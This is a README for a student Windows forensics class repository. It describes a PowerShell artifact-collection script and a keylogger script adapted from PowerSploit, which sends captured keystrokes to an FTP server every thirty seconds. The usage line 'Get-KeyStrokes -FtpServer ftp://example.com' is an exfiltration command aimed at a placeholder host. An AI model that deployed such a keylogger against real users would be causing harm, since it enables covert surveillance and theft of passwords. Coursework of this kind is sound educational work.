# DFIR_trd6577_CSEC475
Windows Forensics Repository

This repository is for work done in my Windows Forensics class at RIT

## Get-Artifacts
This Powershell script gets a large amount of artifacts from a computer. Some of these artifacts include:
* Time
* Windows version
* Hardware specs
* Domain controller information
* List of users (local, domain, system, and service)
* Services/programs that start on boot
* ARP and routing tables
* Network interface information
* Established connections and their associated process IDs
* Process list
* Driver list

### Usage
`Get-Artifacts.ps1 [-Csv] [-CsvPath C:\desired\path\to\csv] [-Email] [-Computers computer1,computer2,computer3]`

By default, Get-Artifacts (run without any arguments) outputs the artifacts collected from the local computer onto the screen
* -Csv tells the script to output the artifacts in a CSV file
* -CsvPath specifies where to place the CSV file. By default, -CsvPath is set to the directory the script is placed in
* -Email means that you want to generate a csv file and email it to someone. This option only works with Gmail accounts
that do not have two factor authentication enabled and have changed their Google settings to allow insecure app access
* -Computers allows you to specify remote computer to connect to and gather this information from

## Get-KeyStrokes
This powershell script uses much of the work done by Chris Campbell and Matthew Graeber in their key logger script
(which is part of their PowerSpolit Library). It logs a user's keystrokes and then sends the keystrokes to an ftp
server every thirty seconds.

### Usage
`Get-KeyStrokes -FtpServer ftp://example.com`

Logs in with anonymous/anonymous

## Author
Repository owner: Tom Daniels
